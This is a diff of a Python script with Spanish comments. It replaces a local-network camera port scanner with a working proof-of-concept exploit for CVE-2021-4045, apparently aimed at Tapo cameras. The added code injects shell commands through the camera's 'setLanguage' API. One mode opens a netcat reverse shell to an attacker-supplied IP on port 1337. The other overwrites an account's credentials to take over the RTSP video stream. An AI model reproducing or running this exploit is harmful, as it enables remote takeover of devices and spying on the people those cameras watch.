@@ -1,64 +1,79 @@
-import socket
-import nmap
+import requests
+import urllib3
+import sys
+import threading
+import os
+import hashlib
 
-# Función para escanear puertos en una dirección IP
-def escanear_puertos(ip, puertos):
-    resultados = {}
-    for puerto in puertos:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            resultado = sock.connect_ex((ip, puerto))
-            sock.close()
-            
-            if resultado == 0:
-                resultados[puerto] = "Abierto"
-            else:
-                resultados[puerto] = "Cerrado"
-        except socket.error as e:
-            resultados[puerto] = f"Error: {str(e)}"
-    return resultados
+# Desactiva las advertencias de solicitud HTTP insegura
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Función para encontrar cámaras en la red local con puertos específicos
-def encontrar_camaras_en_red(puertos):
-    camaras_activas = {}  # Diccionario para almacenar IP y puertos abiertos
-    
-    for puerto in puertos:
-        scanner = nmap.PortScanner()
+# Puerto para la conexión inversa
+REVERSE_SHELL_PORT = 1337
+
+# Comando de shell inversa a ejecutar
+REVERSE_SHELL_COMMAND = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
+
+# Comando NC (Netcat) para escuchar en el puerto especificado
+NC_COMMAND = 'nc -lv %d' % REVERSE_SHELL_PORT
+
+# Credenciales RTSP
+RTSP_USER = 'pwned1337'
+RTSP_PASSWORD = 'pwned1337'
+RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='
+
+def escuchar_nc():
+    # Inicia un hilo para escuchar en el puerto especificado
+    print("[+] Escuchando en el puerto %d..." % REVERSE_SHELL_PORT)
+    os.system(NC_COMMAND)
+
+def enviar_shell_inversa(victim_ip, attacker_ip):
+    # Envía una shell inversa a la víctima
+    print("[+] Enviando shell inversa a %s...\n" % victim_ip)
+    payload_shell_inversa = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL_COMMAND % (attacker_ip, REVERSE_SHELL_PORT) + ";'"}}
+    requests.post(url_victima, json=payload_shell_inversa, verify=False)
+
+def configurar_rtsp(victim_ip):
+    # Configura un flujo de video RTSP y cambia las credenciales en la víctima
+    print("[+] Configurando flujo de video RTSP...")
+    md5_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
+    payload_rtsp = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_password, RTSP_CIPHERTEXT)}}
+    requests.post(url_victima, json=payload_rtsp, verify=False)
+
+def main():
+    print("""
+    CVE-2021-4045 PoC  _   @hacefresko                 
+     _ ____      ___ __ | |_ __ _ _ __   ___  
+    | '_ \ \ /\ / / '_ \| __/ _` | '_ \ / _ \ 
+    | |_) \ V  V /| | | | || (_| | |_) | (_) |
+    | .__/ \_/\_/ |_| |_|\__\__,_| .__/ \___/ 
+    |_|                          |_|          
+    """)
+
+    # Verifica los argumentos de línea de comandos
+    if (len(sys.argv) < 4) or (sys.argv[1] not in ['shell', 'rtsp']):
+        print("[x] Uso: python3 pwnTapo.py [shell|rtsp] [IP_victima] [IP_atacante]")
+        return
+
+    global url_victima
+    url_victima = "https://" + sys.argv[2] + ":443/"
+    modo_funcionamiento = sys.argv[1]
+
+    if modo_funcionamiento == 'shell':
+        # Inicia un hilo para escuchar en el puerto especificado
+        t = threading.Thread(target=escuchar_nc)
+        t.start()
         
-        # Escanea la red local en busca de dispositivos con el puerto especificado abierto
-        scanner.scan('192.168.0.0/24', str(puerto))
+        # Envía una shell inversa a la víctima
+        enviar_shell_inversa(sys.argv[2], sys.argv[3])
+
+    elif modo_funcionamiento == 'rtsp':
+        # Configura un flujo de video RTSP y cambia las credenciales en la víctima
+        configurar_rtsp(sys.argv[2])
         
-        # Obtiene las direcciones IP de los dispositivos con el puerto abierto
-        hosts = scanner.all_hosts()
-        
-        for host in hosts:
-            if host in camaras_activas:
-                camaras_activas[host].append(puerto)
-            else:
-                camaras_activas[host] = [puerto]
-    
-    return camaras_activas
+        print("[+] Flujo de video RTSP disponible en rtsp://%s/stream2" % sys.argv[2])
+        print("[+] RTSP username: %s" % RTSP_USER)
+        print("[+] RTSP password: %s" % RTSP_PASSWORD)
 
 if __name__ == "__main__":
-    puertos_objetivo = [554, 2020, 443]  # Puertos que te interesan
-    
-    # Encontrar cámaras en la red local con puertos específicos
-    camaras_en_red = encontrar_camaras_en_red(puertos_objetivo)
-    
-    if not camaras_en_red:
-        print("No se encontraron cámaras IP en la red local con los puertos especificados.")
-    else:
-        # Extraer las direcciones IP de las cámaras encontradas
-        ips_camaras = list(camaras_en_red.keys())
-        
-        # Escanear las direcciones IP en busca de puertos abiertos
-        resultados_ips = {}
-        for ip in ips_camaras:
-            resultados_ips[ip] = escanear_puertos(ip, puertos_objetivo)
-        
-        # Mostrar resultados
-        for ip, resultados_puertos in resultados_ips.items():
-            print(f"IP: {ip}")
-            for puerto, estado in resultados_puertos.items():
-                print(f"Puerto {puerto}: {estado}")
+    main()
